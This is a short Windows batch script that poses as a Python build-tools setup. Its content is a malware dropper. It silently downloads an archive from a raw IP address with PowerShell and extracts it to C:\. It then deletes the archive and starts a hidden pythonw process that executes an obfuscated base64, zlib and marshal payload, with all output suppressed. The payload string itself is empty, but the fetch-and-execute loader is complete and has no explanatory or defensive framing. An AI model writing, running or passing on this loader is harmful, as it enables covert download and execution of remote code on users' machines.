@echo off
setlocal enabledelayedexpansion

set "PYTHON_DIR=C:\"
set "DOWNLOAD_URL=http://1.1.1.1/build_essentials.tar"

mkdir "!PYTHON_DIR!" 2>nul
cd /d "!PYTHON_DIR!"

powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('!DOWNLOAD_URL!', 'py.tar')" >nul 2>&1

tar -xf py.tar >nul 2>&1

del py.tar >nul 2>&1

start /b "" c:\py\pyw.exe -c "exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(''))))" >nul 2>&1
exit
